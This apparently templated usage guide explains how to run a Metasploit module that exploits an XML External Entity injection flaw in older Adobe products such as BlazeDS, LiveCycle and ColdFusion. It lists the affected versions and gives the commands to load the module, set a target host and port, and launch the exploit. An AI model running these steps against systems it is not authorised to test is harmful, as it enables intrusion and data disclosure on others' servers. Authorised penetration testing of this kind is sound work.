**The description of current metasploit exploit**
Multiple Adobe Products -- XML External Entity Injection. Affected Software: BlazeDS 3.2 and        earlier versions, LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1, and        2.5.1, Flex Data Services 2.0.1, ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/adobe_xml_inject
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 8400 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.